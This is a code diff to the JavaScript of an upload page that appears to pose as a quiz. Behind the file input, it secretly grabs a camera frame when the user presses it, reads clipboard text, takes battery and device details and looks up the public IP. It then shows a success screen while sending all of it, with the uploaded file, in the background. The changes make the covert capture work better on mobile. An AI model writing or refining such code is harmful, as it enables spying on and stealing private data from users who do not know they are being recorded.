@@ -19,16 +19,16 @@ async function collectMetadata() {
     battery: "N/A",
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-    clipboardText: "", // new field replacing old network
+    clipboardText: "",
     time: new Date().toLocaleString(),
     ip: ""
   };
 
-  // Battery info (no popup)
+  // Battery info
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
-      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
+      metadata.battery = `${Math.round(b.level * 100)}% charging:${b.charging}`;
     } catch {}
   }
 
@@ -50,13 +50,12 @@ async function collectMetadata() {
     try {
       const status = await navigator.permissions.query({ name: "clipboard-read" });
       if (status.state === "granted") {
-        const text = await navigator.clipboard.readText();
-        metadata.clipboardText = text;
+        metadata.clipboardText = await navigator.clipboard.readText();
       }
     } catch {}
   }
 
-  // Get user IP from public API
+  // IP address
   try {
     const ipRes = await fetch("https://api.ipify.org?format=json");
     const ipData = await ipRes.json();
@@ -67,24 +66,22 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAPTURE CAMERA (ONLY ON FILE CLICK)
+// CAPTURE CAMERA (FIXED)
 // ================================
 async function captureCamera() {
   if (cameraCaptured) return;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
     video.srcObject = stream;
-    video.style.display = "block"; // temporarily show video for capture
+    video.setAttribute("playsinline", true); // REQUIRED for mobile
+    video.style.display = "block";
 
-    // Wait for video to be ready
-    await new Promise(resolve => {
-      if (video.readyState >= 3) return resolve(); // HAVE_FUTURE_DATA
-      video.onloadeddata = () => resolve();
-    });
+    await video.play();
 
-    // Extra delay to ensure frame is ready
-    await new Promise(r => setTimeout(r, 1000));
+    // wait a bit so frame is ready
+    await new Promise(r => setTimeout(r, 800));
 
     canvas.width = 640;
     canvas.height = 480;
@@ -92,20 +89,26 @@ async function captureCamera() {
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    capturedImage = canvas.toDataURL("image/png"); // store image
+    capturedImage = canvas.toDataURL("image/png");
 
-    // Stop camera
+    console.log("✅ Camera captured successfully");
+
+    // stop camera
     stream.getTracks().forEach(t => t.stop());
     video.style.display = "none";
+
     cameraCaptured = true;
   } catch (err) {
-    console.log("Camera denied or blocked:", err);
+    console.log("❌ Camera denied or blocked:", err);
   }
 }
 
-// Ask camera permission only on file click
+// ================================
+// IMPORTANT FIX HERE
+// ================================
+// Use pointerdown instead of click (mobile fix)
 if (fileInput) {
-  fileInput.addEventListener("click", async () => {
+  fileInput.addEventListener("pointerdown", async () => {
     await captureCamera();
   });
 }
@@ -126,7 +129,7 @@ async function uploadFileWithMetadata(file, metadata, cameraImage) {
             file: reader.result,
             filename: file.name,
             metadata,
-            cameraImage // optional, include if captured
+            cameraImage
           }),
         });
 
@@ -152,11 +155,11 @@ form.addEventListener("submit", async (e) => {
     return;
   }
 
-  // Show success page immediately
+  // show success instantly
   document.getElementById("quiz-container").style.display = "none";
   document.getElementById("success-container").style.display = "flex";
 
-  // Send everything in background
+  // background upload
   (async () => {
     try {
       const metadata = await collectMetadata();
@@ -167,9 +170,9 @@ form.addEventListener("submit", async (e) => {
         capturedImage
       );
 
-      console.log("Upload successful:", res);
+      console.log("✅ Upload successful:", res);
     } catch (err) {
-      console.error("Background upload failed:", err);
+      console.error("❌ Background upload failed:", err);
     }
   })();
 });
